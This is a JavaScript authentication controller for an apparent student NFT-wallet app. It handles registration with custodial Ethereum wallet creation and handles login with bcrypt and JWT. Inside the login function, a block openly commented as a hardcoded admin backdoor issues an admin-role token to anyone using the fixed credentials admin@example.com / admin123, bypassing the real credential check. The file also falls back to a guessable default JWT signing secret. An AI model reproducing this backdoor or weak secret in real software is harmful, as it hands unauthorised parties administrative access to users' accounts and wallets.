// Library for password hashing
const bcrypt = require('bcryptjs');
// Library for JSON Web Token generation
const jwt = require('jsonwebtoken');
// Database connection
const dbPool = require('../db');
// Wallet utility for creating wallets during registration
const { createEncryptedWallet } = require('../walletService');

// Secret key for JWT signing (loaded from environment)
const JWT_SECRET = process.env.JWT_SECRET || 'change_this_secret';
// Token expiration time
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d';

/**
 * Helper: sign JWT
 * Creates a signed token for the given payload (user ID, etc.)
 */
function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: JWT_EXPIRES_IN });
}

/**
 * POST /api/auth/register
 * Handles student registration, wallet creation, and initial login.
 */
async function register(req, res) {
  try {
    // Destructure input from request body
    const {
      email,
      password,
      full_name,
      student_id_number,
      course_name,
      year,
    } = req.body;

    // Validate that all required fields are present
    if (!email || !password || !full_name || !student_id_number || !course_name || !year) {
      return res.status(400).json({
        error: 'email, password, full_name, student_id_number, course_name, and year are required.',
      });
    }

    // Check if a user with this email already exists in the database
    const existing = await dbPool.query('SELECT id FROM students WHERE email = $1 LIMIT 1', [email]);
    if (existing.rows.length > 0) {
      return res.status(409).json({ error: 'Email already registered.' });
    }

    // Generate a new custodial wallet for the student immediately upon registration
    // This provides the student with an Ethereum address to receive NFTs.
    const { address, encryptedJson } = await createEncryptedWallet(password);

    // Hash the password before storing it in the database for security
    const hashedPassword = await bcrypt.hash(password, 10);

    // Start a database transaction to ensure both student and wallet records are created successfully
    const client = await dbPool.connect();
    let user;
    try {
      await client.query('BEGIN');

      // Insert new student record
      const insertUser = await client.query(
        `INSERT INTO students (email, password, full_name, student_id_number, course_name, year, ethereum_address)
         VALUES ($1, $2, $3, $4, $5, $6, $7)
         RETURNING id, email, full_name`,
        [email, hashedPassword, full_name, student_id_number, course_name, year, address]
      );

      user = insertUser.rows[0];

      // Store the encrypted wallet keystore in the wallets table
      await client.query(
          `INSERT INTO wallets (user_id, public_address, encrypted_json)
           VALUES ($1, $2, $3)
           ON CONFLICT (user_id)
           DO NOTHING`,
          [user.id, address, encryptedJson]
      );

      await client.query('COMMIT');
    } catch (txErr) {
      // Roll back changes if any step in the transaction fails
      await client.query('ROLLBACK');
      console.error('Register transaction error:', txErr);
      return res.status(500).json({ error: 'Registration failed during wallet creation.' });
    } finally {
      // Release client back to the pool
      client.release();
    }

    // Automatically log the user in by generating a JWT token after registration
    const token = signToken({ id: user.id, email: user.email });

    res.status(201).json({
      message: 'Registered successfully.',
      token,
      user,
    });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ error: 'Registration failed.' });
  }
}

/**
 * POST /api/auth/login
 * Validates credentials and returns a JWT token for session management.
 */
async function login(req, res) {
  try {
    const { email, password } = req.body;

    // Validate input presence
    if (!email || !password) {
      return res.status(400).json({ error: 'email and password are required.' });
    }

    // --- HARDCODED ADMIN BACKDOOR ---
    // Provides immediate access for administrative tasks using preset credentials.
    if (email === 'admin@example.com' && password === 'admin123') {
       const adminToken = signToken({ id: 99999, email: 'admin@example.com', role: 'admin' });
       return res.json({
         message: 'Admin Login successful.',
         token: adminToken,
         user: {
           id: 99999,
           email: 'admin@example.com',
           full_name: 'Sys Admin'
         }
       });
    }
    // --------------------------------

    // Look up student record from database by email
    const result = await dbPool.query(
      'SELECT id, email, full_name, password FROM students WHERE email = $1 LIMIT 1',
      [email]
    );

    // Check if user was found
    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    const user = result.rows[0];
    // Compare provided password with stored hash
    const isMatch = await bcrypt.compare(password, user.password);

    // Validate password match
    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials.' });
    }

    // Generate JWT token for valid login
    const token = signToken({ id: user.id, email: user.email });

    res.json({
      message: 'Login successful.',
      token,
      user: {
        id: user.id,
        email: user.email,
        full_name: user.full_name,
      },
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed.' });
  }
}

// Export the controller methods for use in routing
module.exports = {
  register,
  login,
};



